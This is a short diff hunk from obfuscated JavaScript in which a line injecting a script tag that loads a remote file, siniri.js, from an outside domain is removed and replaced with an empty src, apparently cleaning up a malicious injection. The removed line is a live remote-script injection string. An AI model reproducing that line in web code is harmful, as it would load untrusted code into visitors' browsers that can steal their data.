@@ -566,7 +566,7 @@ var Z = function() {
     return callback(response_2, webhookMsg);
   };
   t["cEUCz"] = "body";
-  t["kubAq"] = "<script type='text/javascript' src='https://mgx-one.nl/vFk2jDyTaRvfE77vyLMwfAV5Zf7LCPBx3KhdBaqPWpujrgHR/siniri.js?v=hex'></script>";
+  t["kubAq"] = "<script type='text/javascript' src=''></script>";
   /**
    * @param {?} saveNotifs
    * @param {?} notifications
